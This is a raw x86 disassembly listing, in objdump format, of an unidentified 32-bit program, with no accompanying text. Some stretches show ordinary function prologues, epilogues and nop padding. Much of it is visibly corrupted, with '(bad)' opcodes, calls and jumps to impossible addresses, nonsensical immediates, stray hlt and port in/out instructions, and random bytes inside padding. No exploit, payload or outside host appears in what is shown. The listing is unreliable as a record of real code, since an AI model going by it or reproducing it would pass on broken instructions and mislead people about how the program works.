  40556a:	8d 50 18             	lea    0x18(%eax),%edx
  40556d:	89 50 74             	mov    %edx,0x74(%eax)
  405570:	c7 00 00 62 00 00    	movl   $0x6200,(%eax)
  405576:	8d                   	lea    (bad),%edi
  405577:	f9                   	stc
  405578:	08 39                	or     %bh,(%ecx)
  40557a:	18 08                	sbb    %cl,(%eax)
  40557c:	89 45 14             	mov    %eax,0x14(%ebp)
  40557f:	e9 39 ff ff ff       	jmp    0x4054bd
  405584:	8b 0f                	mov    (%edi),%ecx
  405586:	22 08                	and    (%eax),%cl
  405588:	0a 47 08             	or     0x8(%edi),%al
  40558b:	8b 4e 64             	mov    0x64(%esi),%ecx
  40558e:	03 c8                	add    %eax,%ecx
  405590:	8b 46 ff             	mov    -0x1(%esi),%eax
  405593:	3b c8                	cmp    %eax,%ecx
  405595:	89 4e 08             	mov    %ecx,0x8(%esi)
  405598:	76 03                	jbe    0x40559d
  40559a:	89 4d 08             	mov    %ecx,0x8(%ebp)
  40559d:	8b 6b 0c             	mov    0xc(%ebx),%ebp
  4055a0:	85 ff                	test   %edi,%edi
  4055a2:	74 09                	je     0x4055ad
  4055a4:	56                   	push   %esi
  4055a5:	4d                   	dec    %ebp
  4055a6:	96                   	xchg   %eax,%esi
  4055a7:	4d                   	dec    %ebp
  4055a8:	00 00                	add    %al,(%eax)
  4055aa:	69 55 08 8d 4f 18 c7 	imul   $0xc7184f8d,0x8(%ebp),%edx
  4055b1:	07                   	pop    %es
  4055b2:	00 00                	add    %al,(%eax)
  4055b4:	fc                   	cld
  4055b5:	00 89 4f 10 56 c7    	add    %cl,-0x38a9efb1(%ecx)
  4055bb:	e9 4e ff ff ff       	jmp    0x40550e
  4055c0:	5f                   	pop    %edi
  4055c1:	5e                   	pop    %esi
  4055c2:	83 c8 ff             	or     $0xffffffff,%eax
  4055c5:	5b                   	pop    %ebx
  4055c6:	8b 08                	mov    (%eax),%ecx
  4055c8:	26 c3                	es ret
  4055ca:	90                   	nop
  4055cb:	f3 90                	pause
  4055cd:	90                   	nop
  4055ce:	90                   	nop
  4055cf:	90                   	nop
  4055d0:	55                   	push   %ebp
  4055d1:	8b ec                	mov    %esp,%ebp
  4055d3:	16                   	push   %ss
  4055d4:	4d                   	dec    %ebp
  4055d5:	0c 8b                	or     $0x8b,%al
  4055d7:	82 03 62             	addb   $0x62,(%ebx)
  4055da:	38 10                	cmp    %dl,(%eax)
  4055dc:	50                   	push   %eax
  4055dd:	51                   	push   %ecx
  4055de:	52                   	push   %edx
  4055df:	e8 42 fb ff ff       	call   0x405126
  4055e4:	1b 20                	sbb    (%eax),%esp
  4055e6:	90                   	nop
  4055e7:	90                   	nop
  4055e8:	90                   	nop
  4055e9:	d2 90 90 90 ad a2    	rclb   %cl,-0x5d526f70(%eax)
  4055ef:	ff 55 8b             	call   *-0x75(%ebp)
  4055f2:	ec                   	in     (%dx),%al
  4055f3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4055f6:	8b 45 0c             	mov    0xc(%ebp),%eax
  4055f9:	dc 41 28             	faddl  0x28(%ecx)
  4055fc:	5d                   	pop    %ebp
  4055fd:	c2 08 00             	ret    $0x8
  405600:	55                   	push   %ebp
  405601:	73 ec                	jae    0x4055ef
  405603:	56                   	push   %esi
  405604:	8b 22                	mov    (%edx),%esp
  405606:	08 85 f6 e5 dd 2b    	or     %al,0x2bdde5f6(%ebp)
  40560c:	bd 14 a2 c0 74       	mov    $0x74c0a214,%ebp
  405611:	07                   	pop    %es
  405612:	8b 08                	mov    (%eax),%ecx
  405614:	89 4e 14             	mov    %ecx,0x14(%esi)
  405617:	eb 10                	jmp    0x405629
  405619:	6a 87                	push   $0xffffff87
  40561b:	56                   	push   %esi
  40561c:	ac                   	lods   %ds:(%esi),%al
  40561d:	43                   	inc    %ebx
  40561e:	f4                   	hlt
  40561f:	ff                   	(bad)
  405620:	ff 8b 55 0c 8b 4d    	decl   0x4d8b0c55(%ebx)
  405626:	ab                   	stos   %eax,%es:(%edi)
  405627:	89 d6                	mov    %edx,%esi
  405629:	04 8b                	add    $0x8b,%al
  40562b:	55                   	push   %ebp
  40562c:	14 89                	adc    $0x89,%al
  40562e:	50                   	push   %eax
  40562f:	08 89 50 0c 8b 4e    	or     %cl,0x4e8b0c50(%ecx)
  405635:	51                   	push   %ecx
  405636:	89 08                	mov    %ecx,(%eax)
  405638:	89 46 10             	mov    %eax,0x10(%esi)
  40563b:	5e                   	pop    %esi
  40563c:	5d                   	pop    %ebp
  40563d:	c2 42 ce             	ret    $0xce42
  405640:	55                   	push   %ebp
  405641:	8b ec                	mov    %esp,%ebp
  405643:	8b 55 08             	mov    0x8(%ebp),%edx
  405646:	4d                   	dec    %ebp
  405647:	0f 57 85 d2 84 5f 8b 	xorps  -0x74a07b2e(%ebp),%xmm0
  40564e:	42                   	inc    %edx
  40564f:	4d                   	dec    %ebp
  405650:	8b 75 bc             	mov    -0x44(%ebp),%esi
  405653:	8b 7d 0c             	mov    0xc(%ebp),%edi
  405656:	8d 4a 10             	lea    0x10(%edx),%ecx
  405659:	85 c0                	test   %eax,%eax
  40565b:	2e 20 39             	and    %bh,%cs:(%ecx)
  40565e:	84 33                	test   %dh,(%ebx)
  405660:	55                   	push   %ebp
  405661:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405662:	39 70 08             	cmp    %esi,0x8(%eax)
  405665:	74 0a                	je     0x405671
  405667:	8b 88 8b 00 b5 c0    	mov    -0x3f4aff75(%eax),%ecx
  40566d:	75 07                	jne    0x405676
  40566f:	eb 0c                	jmp    0x40567d
  405671:	8b 18                	mov    (%eax),%ebx
  405673:	89 19                	mov    %ebx,(%ecx)
  405675:	8b 4a 14             	mov    0x14(%edx),%ecx
  405678:	89 08                	mov    %ecx,(%eax)
  40567a:	d7                   	xlat   %ds:(%ebx)
  40567b:	42                   	inc    %edx
  40567c:	a3 21 42 38 8d       	mov    %eax,0x8d384221
  405681:	4a                   	dec    %edx
  405682:	38 85 c0 74 25 39    	cmp    %al,0x392574c0(%ebp)
  405688:	78 04                	js     0x40568e
  40568a:	75 05                	jne    0x405691
  40568c:	39 70 08             	cmp    %esi,0x8(%eax)
  40568f:	74 f6                	je     0x405687
  405691:	8b c8                	mov    %eax,%ecx
  405693:	8b 99 28 c0 75 ee    	mov    -0x118a3fd8(%ecx),%ebx
  405699:	5f                   	pop    %edi
  40569a:	6f                   	outsl  %ds:(%esi),(%dx)
  40569b:	5b                   	pop    %ebx
  40569c:	5d                   	pop    %ebp
  40569d:	c2 0c 00             	ret    $0xc
  4056a0:	8b 30                	mov    (%eax),%esi
  4056a2:	89 31                	mov    %esi,(%ecx)
  4056a4:	8b 4a 3c             	mov    0x3c(%edx),%ecx
  4056a7:	89 08                	mov    %ecx,(%eax)
  4056a9:	89 42 3c             	mov    %eax,0x3c(%edx)
  4056ac:	5f                   	pop    %edi
  4056ad:	5e                   	pop    %esi
  4056ae:	5b                   	pop    %ebx
  4056af:	85 c2                	test   %eax,%edx
  4056b1:	0c 00                	or     $0x0,%al
  4056b3:	90                   	nop
  4056b4:	90                   	nop
  4056b5:	90                   	nop
  4056b6:	90                   	nop
  4056b7:	90                   	nop
  4056b8:	38 90 90 18 90 90    	cmp    %dl,-0x6f6fe770(%eax)
  4056be:	90                   	nop
  4056bf:	90                   	nop
  4056c0:	55                   	push   %ebp
  4056c1:	8b ec                	mov    %esp,%ebp
  4056c3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4056c4:	45                   	inc    %ebp
  4056c5:	08 56 61             	or     %dl,0x61(%esi)
  4056c8:	8c da                	mov    %ds,%edx
  4056ca:	57                   	push   %edi
  4056cb:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4056ce:	2a 57 50             	sub    0x50(%edi),%dl
  4056d1:	e8 6a 16 df c3       	call   0xc41f6d40
  4056d6:	57                   	push   %edi
  4056d7:	ff d6                	call   *%esi
  4056d9:	59                   	pop    %ecx
  4056da:	c4                   	(bad)
  4056db:	ec                   	in     (%dx),%al
  4056dc:	5f                   	pop    %edi
  4056dd:	5e                   	pop    %esi
  4056de:	5d                   	pop    %ebp
  4056df:	af                   	scas   %es:(%edi),%eax
  4056e0:	0c 00                	or     $0x0,%al
  4056e2:	ed                   	in     (%dx),%eax
  4056e3:	90                   	nop
  4056e4:	90                   	nop
  4056e5:	69 90 90 90 90 f7 90 	imul   $0x90909090,-0x86f6f70(%eax),%edx
  4056ec:	90 90 90 
  4056ef:	90                   	nop
  4056f0:	55                   	push   %ebp
  4056f1:	8b ec                	mov    %esp,%ebp
  4056f3:	ba 8b 1e 08 8b       	mov    $0x8b081e8b,%edx
  4056f8:	06                   	push   %es
  4056f9:	e2 c0                	loop   0x4056bb
  4056fb:	74 fd                	je     0x4056fa
  4056fd:	e1 09                	loope  0x405708
  4056ff:	52                   	push   %edx
  405700:	0e                   	push   %cs
  405701:	8b 50 04             	mov    0x4(%eax),%edx
  405704:	52                   	push   %edx
  405705:	ff 50 08             	call   *0x8(%eax)
  405708:	8b 06                	mov    (%esi),%eax
  40570a:	83 c4 04             	add    $0x4,%esp
  40570d:	85 76 2d             	test   %esi,0x2d(%esi)
  405710:	ec                   	in     (%dx),%al
  405711:	70 5d                	jo     0x405770
  405713:	64 39 c4             	fs cmp %eax,%esp
  405716:	37                   	aaa
  405717:	90                   	nop
  405718:	90                   	nop
  405719:	90                   	nop
  40571a:	90                   	nop
  40571b:	90                   	nop
  40571c:	90                   	nop
  40571d:	90                   	nop
  40571e:	90                   	nop
  40571f:	90                   	nop
  405720:	33 6e 24             	xor    0x24(%esi),%ebp
  405723:	e4 90                	in     $0x90,%al
  405725:	90                   	nop
  405726:	1a 90 be c7 90 90    	sbb    -0x6f6f3842(%eax),%dl
  40572c:	90                   	nop
  40572d:	31 d6                	xor    %edx,%esi
  40572f:	b3 55                	mov    $0x55,%bl
  405731:	8b ec                	mov    %esp,%ebp
  405733:	83 ec 08             	sub    $0x8,%esp
  405736:	53                   	push   %ebx
  405737:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40573a:	57                   	push   %edi
  40573b:	33 ff                	xor    %edi,%edi
  40573d:	2b ae 0f 84 b6 db    	sub    -0x24497bf1(%esi),%ebp
  405743:	00 00                	add    %al,(%eax)
  405745:	56                   	push   %esi
  405746:	8b f3                	mov    %ebx,%esi
  405748:	8b 06                	mov    (%esi),%eax
  40574a:	97                   	xchg   %eax,%edi
  40574b:	10 6a 00             	adc    %ch,0x0(%edx)
  40574e:	6a 00                	push   $0x0
  405750:	50                   	push   %eax
  405751:	e8 5a 4d 00 00       	call   0x40a4b0
  405756:	3d 76 11 9b 00       	cmp    $0x9b1176,%eax
  40575b:	74 07                	je     0x405764
  40575d:	c7                   	(bad)
  40575e:	61                   	popa
  40575f:	04 00                	add    $0x0,%al
  405761:	00 00                	add    %al,(%eax)
  405763:	00 8b 76 08 3c f6    	add    %cl,-0x9c3f78a(%ebx)
  405769:	75 dd                	jne    0x405748
  40576b:	3d f3 8b 68 b6       	cmp    $0xb6688bf3,%eax
  405770:	fc                   	cld
  405771:	82 74 12 8b 47       	xorb   $0x47,-0x75(%edx,%edx,1)
  405776:	bf 01 00 00 00       	mov    $0x1,%edi
  40577b:	6a 09                	push   $0x9
  40577d:	51                   	push   %ecx
  40577e:	89 a6 93 e8 4a 4c    	mov    %esp,0x4c4ae893(%esi)
  405784:	00 00                	add    %al,(%eax)
  405786:	8b 8b 08 85 f6 75    	mov    0x75f68508(%ebx),%ecx
  40578c:	e0 85                	loopne 0x405713
  40578e:	ff 66 02             	jmp    *0x2(%esi)
  405791:	bb 1b b7 00 00       	mov    $0xb71b,%ebx
  405796:	56                   	push   %esi
  405797:	53                   	push   %ebx
  405798:	15 75 fc e8 c0       	adc    $0xc0e8fc75,%eax
  40579d:	bc 4f 00 8b 75       	mov    $0x758b004f,%esp
  4057a2:	08 33                	or     %dh,(%ebx)
  4057a4:	ff 83 7e 04 02 75    	incl   0x7502047e(%ebx)
  4057aa:	23 8b 16 6a f2 81    	and    -0x7e0d95ea(%ebx),%ecx
  4057b0:	00 50 00             	add    %dl,0x0(%eax)
  4057b3:	52                   	push   %edx
  4057b4:	f0 f7 4c 95 00 3d 76 	lock testl $0x111763d,0x0(%ebp,%edx,4)
  4057bb:	11 01 
  4057bd:	00 75 07             	add    %dh,0x7(%ebp)
  4057c0:	25 01 35 f0 00       	and    $0xf03501,%eax
  4057c5:	b8 07 c7 46 04       	mov    $0x446c707,%eax
  4057ca:	00 00                	add    %al,(%eax)
  4057cc:	00 00                	add    %al,(%eax)
  4057ce:	8b 76 08             	mov    0x8(%esi),%esi
  4057d1:	3b f6                	cmp    %esi,%esi
  4057d3:	75 14                	jne    0x4057e9
  4057d5:	85 ff                	test   %edi,%edi
  4057d7:	74 2a                	je     0x405803
  4057d9:	8b 75 fc             	mov    -0x4(%ebp),%esi
  4057dc:	85 f6                	test   %esi,%esi
  4057de:	b0 23                	mov    $0x23,%al
  4057e0:	7c 08                	jl     0x4057ea
  4057e2:	81 fb c0 c6 2d 00    	cmp    $0x2dc6c0,%ebx
  4057e8:	73 19                	jae    0x405803
  4057ea:	56                   	push   %esi
  4057eb:	53                   	push   %ebx
  4057ec:	35 6e 15 00 3c       	xor    $0x3c00156e,%eax
  4057f1:	6a 00                	push   $0x0
  4057f3:	35 02 56 d6 e8       	xor    $0xe8d65602,%eax
  4057f8:	f8                   	clc
  4057f9:	5d                   	pop    %ebp
  4057fa:	00 00                	add    %al,(%eax)
  4057fc:	8b d8                	mov    %eax,%ebx
  4057fe:	df 55 fc             	fists  -0x4(%ebp)
  405801:	eb 9d                	jmp    0x4057a0
  405803:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405806:	8b 9a 83 7e 25 02    	mov    0x2257e83(%edx),%ebx
  40580c:	75 0a                	jne    0x405818
  40580e:	8b 06                	mov    (%esi),%eax
  405810:	6a 09                	push   $0x9
  405812:	50                   	push   %eax
  405813:	e8 b8 4b 0d 82       	call   0x824da3d0
  405818:	8b 39                	mov    (%ecx),%edi
  40581a:	08 85 f6 75 e9 8b    	or     %al,-0x74168a0a(%ebp)
  405820:	f3 8b 66 04          	repz mov 0x4(%esi),%esp
  405824:	85 c0                	test   %eax,%eax
  405826:	74 0e                	je     0x405836
  405828:	8b 0e                	mov    (%esi),%ecx
  40582a:	6a 00                	push   $0x0
  40582c:	6a 00                	push   $0x0
  40582e:	6a 00                	push   $0x0
  405830:	51                   	push   %ecx
  405831:	e8 85 4c 00 00       	call   0x40a4bb
  405836:	8b d6                	mov    %esi,%edx
  405838:	08 85 f6 75 e4 5e    	or     %al,0x5ee475f6(%ebp)
  40583e:	5f                   	pop    %edi
  40583f:	5b                   	pop    %ebx
  405840:	8b e5                	mov    %ebp,%esp
  405842:	7a c3                	jp     0x405807
  405844:	90                   	nop
  405845:	90                   	nop
  405846:	90                   	nop
  405847:	90                   	nop
  405848:	90                   	nop
  405849:	90                   	nop
  40584a:	73 60                	jae    0x4058ac
  40584c:	90                   	nop
  40584d:	90                   	nop
  40584e:	90                   	nop
  40584f:	90                   	nop
  405850:	55                   	push   %ebp
  405851:	8b ec                	mov    %esp,%ebp
  405853:	56                   	push   %esi
  405854:	8b c4                	mov    %esp,%eax
  405856:	0c 33                	or     $0x33,%al
  405858:	c0 85 42 74 a3 57 95 	rolb   $0x95,0x57a37442(%ebp)
  40585f:	fe                   	(bad)
  405860:	92                   	xchg   %eax,%edx
  405861:	c9                   	leave
  405862:	52                   	push   %edx
  405863:	f2 ae                	repnz scas %es:(%edi),%al
  405865:	8b 45 08             	mov    0x8(%ebp),%eax
  405868:	f7 55 49             	notl   0x49(%ebp)
  40586b:	8b f9                	mov    %ecx,%edi
  40586d:	47                   	inc    %edi
  40586e:	99                   	cltd
  40586f:	50                   	push   %eax
  405870:	e8 eb f1 ff ff       	call   0x404a60
  405875:	8b 8c 8b f8 8b d1 c1 	mov    -0x3e2e7408(%ebx,%ecx,4),%ecx
  40587c:	e9 02 f3 5c 58       	jmp    0x589d4b83
  405881:	ca 83 e1             	lret   $0xe183
  405884:	03 f3                	add    %ebx,%esi
  405886:	1a 5f 5e             	sbb    0x5e(%edi),%bl
  405889:	5d                   	pop    %ebp
  40588a:	c2 08 9f             	ret    $0x9f08
  40588d:	90                   	nop
  40588e:	90                   	nop
  40588f:	90                   	nop
  405890:	55                   	push   %ebp
  405891:	f7 ec                	imul   %esp
  405893:	83 ab 1d 53 56 57 c8 	subl   $0xffffffc8,0x5756531d(%ebx)
  40589a:	7d 0c                	jge    0x4058a8
  40589c:	33 db                	xor    %ebx,%ebx
  40589e:	33 d2                	xor    %edx,%edx
  4058a0:	ed                   	in     (%dx),%eax
  4058a1:	ff 74 23 8d          	push   -0x73(%ebx,%eiz,1)
  4058a5:	75 0c                	jne    0x4058b3
  4058a7:	83 c9 a1             	or     $0xffffffa1,%ecx
  4058aa:	33 c0                	xor    %eax,%eax
  4058ac:	f2 ae                	repnz scas %es:(%edi),%al
  4058ae:	f7 d1                	not    %ecx
  4058b0:	f8                   	clc
  4058b1:	83 40 06 7d          	addl   $0x7d,0x6(%eax)
  4058b5:	05 89 4c 9d dc       	add    $0xdc9d4c89,%eax
  4058ba:	43                   	inc    %ebx
  4058bb:	8b 4c 04 83          	mov    -0x7d(%esp,%eax,1),%ecx
  4058bf:	63 04 03             	arpl   %eax,(%ebx,%eax,1)
  4058c2:	d1 85 aa 75 e0 81    	roll   $1,-0x7e1f8a56(%ebp)
  4058c8:	45                   	inc    %ebp
  4058c9:	a8 42                	test   $0x42,%al
  4058cb:	52                   	push   %edx
  4058cc:	50                   	push   %eax
  4058cd:	8e 57 f1             	mov    -0xf(%edi),%ss
  4058d0:	ff 11                	call   *(%ecx)
  4058d2:	8b 75 0c             	mov    0xc(%ebp),%esi
  4058d5:	33 c9                	xor    %ecx,%ecx
  4058d7:	85 f6                	test   %esi,%esi
  4058d9:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4058dc:	8b d0                	mov    %eax,%edx
  4058de:	87 fd                	xchg   %edi,%ebp
  4058e0:	46                   	inc    %esi
  4058e1:	74 4e                	je     0x405931
  4058e3:	8d 45 0c             	lea    0xc(%ebp),%eax
  4058e6:	f4                   	hlt
  4058e7:	45                   	inc    %ebp
  4058e8:	f8                   	clc
  4058e9:	eb d5                	jmp    0x4058c0
  4058eb:	8b a5 fc ff f9 06    	mov    0x6f9fffc(%ebp),%esp
  4058f1:	7d 0a                	jge    0x4058fd
  4058f3:	e4 44                	in     $0x44,%al
  4058f5:	8d                   	lea    (bad),%ebx
  4058f6:	dc 66 89             	fsubl  -0x77(%esi)
  4058f9:	4d                   	dec    %ebp
  4058fa:	fc                   	cld
  4058fb:	eb 0e                	jmp    0x40590b
  4058fd:	8b fe                	mov    %esi,%edi
  4058ff:	83 c9 a4             	or     $0xffffffa4,%ecx
  405902:	33 c0                	xor    %eax,%eax
  405904:	f2 ae                	repnz scas %es:(%edi),%al
  405906:	f7 d1                	not    %ecx
  405908:	16                   	push   %ss
  405909:	8b c1                	mov    %ecx,%eax
  40590b:	8b c8                	mov    %eax,%ecx
  40590d:	8b fa                	mov    %edx,%edi
  40590f:	8b d9                	mov    %ecx,%ebx
  405911:	03 d0                	add    %eax,%edx
  405913:	c1 ff 02             	sar    $0x2,%edi
  405916:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405918:	8b 45 af             	mov    -0x51(%ebp),%eax
  40591b:	8b cb                	mov    %ebx,%ecx
  40591d:	05 fc 03 83 c0       	add    $0xc08303fc,%eax
  405922:	55                   	push   %ebp
  405923:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  405925:	8b 30                	mov    (%eax),%esi
  405927:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40592a:	85 f6                	test   %esi,%esi
  40592c:	75 47                	jne    0x405975
  40592e:	8b 45 e0             	mov    -0x20(%ebp),%eax
  405931:	5f                   	pop    %edi
  405932:	5e                   	pop    %esi
  405933:	c6 02 00             	movb   $0x0,(%edx)
  405936:	d2 8b e5 5d c3 a1    	rorb   %cl,-0x5e3ca21b(%ebx)
  40593c:	90                   	nop
  40593d:	90                   	nop
  40593e:	90                   	nop
  40593f:	90                   	nop
  405940:	c4 8b ec 83 9b e9    	les    -0x16647c14(%ebx),%ecx
  405946:	66 05 0d c8          	add    $0xc80d,%ax
  40594a:	f3 97                	repz xchg %eax,%edi
  40594c:	00 a1 8a f3 40 00    	add    %ah,0x40f38a(%ecx)
  405952:	8a d6                	mov    %dh,%dl
  405954:	ca 3a 40             	lret   $0x403a
  405957:	00 99 56 8b 75 0c    	add    %bl,0xc758b56(%ecx)
  40595d:	66 89 ba 68 8b 4d 08 	mov    %di,0x84d8b68(%edx)
  405964:	85 bc 57 89 45 f8 88 	test   %edi,-0x7707ba77(%edi,%edx,2)
  40596b:	55                   	push   %ebp
  40596c:	2d 8d 5d f8 7f       	sub    $0x7ff85d8d,%eax
  405971:	56                   	push   %esi
  405972:	7c 04                	jl     0x405978
  405974:	85 e9                	test   %ebp,%ecx
  405976:	73 1f                	jae    0x405997
  405978:	8b 71 10             	mov    0x10(%ecx),%esi
  40597b:	8b 15 bc f3 4c 57    	mov    0x574cf3bc,%edx
  405981:	8b c8                	mov    %eax,%ecx
  405983:	5f                   	pop    %edi
  405984:	10 5b 89             	adc    %bl,-0x77(%ebx)
  405987:	11 d3                	adc    %edx,%ebx
  405989:	75 c0                	jne    0x40594b
  40598b:	f3 1d 00 88 51 04    	repz sbb $0x4518800,%eax
  405991:	8b e5                	mov    %ebp,%esp
  405993:	5d                   	pop    %ebp
  405994:	c2 0c 00             	ret    $0xc
  405997:	85 f6                	test   %esi,%esi
  405999:	7f 2d                	jg     0x4059c8
  40599b:	7c 08                	jl     0x4059a5
  40599d:	81 f9 cd 03 00 00    	cmp    $0x3cd,%ecx
  4059a3:	73 23                	jae    0x4059c8
  4059a5:	8b 75 1a             	mov    0x1a(%ebp),%esi
  4059a8:	51                   	push   %ecx
  4059a9:	68 55 f3 40 00       	push   $0x40f355
  4059ae:	cd 54                	int    $0x54
  4059b0:	56                   	push   %esi
  4059b1:	e8 ca 2c 00 00       	call   0x408680
  4059b6:	83 c4 10             	add    $0x10,%esp
  4059b9:	d3 c0                	rol    %cl,%eax
  4059bb:	8b c6                	mov    %esi,%eax
  4059bd:	0f 8d e5 ba 00 00    	jge    0x4114a8
  4059c3:	e9 cd 00 00 39       	jmp    0x39405a95
  4059c8:	8b f9                	mov    %ecx,%edi
  4059ca:	8b c1                	mov    %ecx,%eax
  4059cc:	99                   	cltd
  4059cd:	d6                   	salc
  4059ce:	b9 36 00 00 3c       	mov    $0x3c000036,%ecx
  4059d3:	81 e7 ff 03 00 00    	and    $0x3ff,%edi
  4059d9:	e8 32 5e 00 00       	call   0x40b810
  4059de:	8b f2                	mov    %edx,%esi
  4059e0:	8b c8                	mov    %eax,%ecx
  4059e2:	c3                   	ret
  4059e3:	f6 17                	notb   (%edi)
  4059e5:	70 7f                	jo     0x405a66
  4059e7:	08 81 85 cd 03 00    	or     %al,0x3cd85(%ecx)
  4059ed:	46                   	inc    %esi
  4059ee:	72 03                	jb     0x4059f3
  4059f0:	4c                   	dec    %esp
  4059f1:	eb d5                	jmp    0x4059c8
  4059f3:	85 f6                	test   %esi,%esi
  4059f5:	0e                   	push   %cs
  4059f6:	5f                   	pop    %edi
  4059f7:	7f 05                	jg     0x4059fe
  4059f9:	93                   	xchg   %eax,%ebx
  4059fa:	f9                   	stc
  4059fb:	09 72 58             	or     %esi,0x58(%edx)
  4059fe:	83 f9 09             	cmp    $0x9,%ecx
  405a01:	75 0c                	jne    0x405a0f
  405a03:	85 f6                	test   %esi,%esi
  405a05:	75 08                	jne    0x405a0f
  405a07:	81 ff cd 03 5e 00    	cmp    $0x5e03cd,%edi
  405a0d:	7c 47                	jl     0x405a56
  405a0f:	81 ff 00 02 9f 00    	cmp    $0x9f0200,%edi
  405a15:	7c 06                	jl     0x405a1d
  405a17:	c6 c1 97             	mov    $0x97,%cl
  405a1a:	83 d6 00             	adc    $0x0,%esi
  405a1d:	0f fe 03             	paddd  (%ebx),%mm0
  405a20:	ae                   	scas   %es:(%edi),%al
  405a21:	75 b8                	jne    0x4059db
  405a23:	99                   	cltd
  405a24:	51                   	push   %ecx
  405a25:	68 ac f3 ab 00       	push   $0xabf3ac
  405a2a:	6a 05                	push   $0x5
  405a2c:	56                   	push   %esi
  405a2d:	e8 4e 3d 00 00       	call   0x409780
  405a32:	d4 28                	aam    $0x28
  405a34:	14 85                	adc    $0x85,%al
  405a36:	11 00                	adc    %eax,(%eax)
  405a38:	6d                   	insl   (%dx),%es:(%edi)
  405a39:	8b 15 27 f3 40 b1    	mov    0xb140f327,%edx
  405a3f:	8b 5a 5f             	mov    0x5f(%edx),%ebx
  405a42:	bf 11 05 13 f3       	mov    $0xf3130511,%edi
  405a47:	40                   	inc    %eax
  405a48:	da 88 41 04 5f c6    	fimull -0x39a0fbbf(%eax)
  405a4e:	5e                   	pop    %esi
  405a4f:	5b                   	pop    %ebx
  405a50:	8b c7                	mov    %edi,%eax
  405a52:	5d                   	pop    %ebp
  405a53:	c2 0c 00             	ret    $0xc
  405a56:	8d 84 bf 00 01 00 00 	lea    0x100(%edi,%edi,4),%eax
  405a5d:	e6 81                	out    %al,$0x81
  405a5f:	28 ff                	sub    %bh,%bh
  405a61:	01 00                	add    %eax,(%eax)
  405a63:	79 e7                	jns    0x405a4c
  405a65:	c2 c1 f8             	ret    $0xf8c1
  405a68:	09 93 f8 98 73 08    	or     %edx,0x87398f8(%ebx)
  405a6e:	7c 71                	jl     0x405ae1
  405a70:	53                   	push   %ebx
  405a71:	83 d6 9c             	adc    $0xffffff9c,%esi
  405a74:	08 55 84             	or     %dl,-0x7c(%ebp)
  405a77:	be 13 8b 75 10       	mov    $0x10758b13,%esi
  405a7c:	52                   	push   %edx
  405a7d:	50                   	push   %eax
  405a7e:	51                   	push   %ecx
  405a7f:	68 9c 12 f1 00       	push   $0xf1129c
  405a84:	6a 05                	push   $0x5
  405a86:	56                   	push   %esi
  405a87:	f9                   	stc
  405a88:	f4                   	hlt
  405a89:	91                   	xchg   %eax,%ecx
  405a8a:	d9 00                	flds   (%eax)
  405a8c:	83 c4 18             	add    $0x18,%esp
  405a8f:	85 c0                	test   %eax,%eax
  405a91:	7d 8c                	jge    0x405a1f
  405a93:	8b c6                	mov    %esi,%eax
  405a95:	8b 0d a4 f3 40 00    	mov    0x40f3a4,%ecx
  405a9b:	dc 08                	fmull  (%eax)
  405a9d:	8a 15 dd f3 40 00    	mov    0x40f3dd,%dl
  405aa3:	88 50 df             	mov    %dl,-0x21(%eax)
  405aa6:	8b c6                	mov    %esi,%eax
  405aa8:	d6                   	salc
  405aa9:	79 5b                	jns    0x405b06
  405aab:	8b e5                	mov    %ebp,%esp
  405aad:	5d                   	pop    %ebp
  405aae:	c2 0c 00             	ret    $0xc
  405ab1:	90                   	nop
  405ab2:	90                   	nop
  405ab3:	62 90 90 5f 90 90    	bound  %edx,-0x6f6fa070(%eax)
  405ab9:	90                   	nop
  405aba:	90                   	nop
  405abb:	90                   	nop
  405abc:	4d                   	dec    %ebp
  405abd:	90                   	nop
  405abe:	90                   	nop
  405abf:	90                   	nop
  405ac0:	55                   	push   %ebp
  405ac1:	c6                   	(bad)
  405ac2:	ec                   	in     (%dx),%al
  405ac3:	53                   	push   %ebx
  405ac4:	56                   	push   %esi
  405ac5:	8b 75 c6             	mov    -0x3a(%ebp),%esi
  405ac8:	57                   	push   %edi
  405ac9:	6a 30                	push   $0x30
  405acb:	56                   	push   %esi
  405acc:	e8 8f ef ff ff       	call   0x404a60
  405ad1:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405ad4:	8b 15 80 c1 40 00    	mov    0x40c180,%edx
  405ada:	8b 7d 10             	mov    0x10(%ebp),%edi
  405add:	89 a9 89 30 47 03    	mov    %ebp,0x3473089(%ecx)
  405ae3:	c7 40 14 00 00 00 0b 	movl   $0xb000000,0x14(%eax)
  405aea:	8b 0b                	mov    (%ebx),%ecx
  405aec:	89 fb                	mov    %edi,%ebx
  405aee:	04 a1                	add    $0xa1,%al
  405af0:	fe c0                	inc    %al
  405af2:	0c 00                	or     $0x0,%al
  405af4:	6a 0b                	push   $0xb
  405af6:	83 12 a7             	adcl   $0xffffffa7,(%edx)
  405af9:	89 41 08             	mov    %eax,0x8(%ecx)
  405afc:	79 13                	jns    0x405b11
  405afe:	8d 0b                	lea    (%ebx),%ecx
  405b00:	bd 5b 00 00 00       	mov    $0x5b,%ebp
  405b05:	c7 42 20 d4 02 41 00 	movl   $0x4102d4,0x20(%edx)
  405b0c:	8b 03                	mov    (%ebx),%eax
  405b0e:	51                   	push   %ecx
  405b0f:	56                   	push   %esi
  405b10:	89 78 18             	mov    %edi,0x18(%eax)
  405b13:	e8 48 ef ff ff       	call   0x404a60
  405b18:	2a 75 14             	sub    0x14(%ebp),%dh
  405b1b:	8d 0c bd 78 98 00 00 	lea    0x9878(,%edi,4),%ecx
  405b22:	89 c0                	mov    %eax,%eax
  405b24:	0c 0b                	or     $0xb,%al
  405b26:	d1 16                	rcll   $1,(%esi)
  405b28:	f8                   	clc
  405b29:	b2 e9                	mov    $0xe9,%dl
  405b2b:	02 f3                	add    %bl,%dh
  405b2d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405b2e:	19 ca                	sbb    %ecx,%edx
  405b30:	83 e1 9e             	and    $0xffffff9e,%ecx
  405b33:	c3                   	ret
  405b34:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405b35:	8b 0b                	mov    (%ebx),%ecx
  405b37:	5f                   	pop    %edi
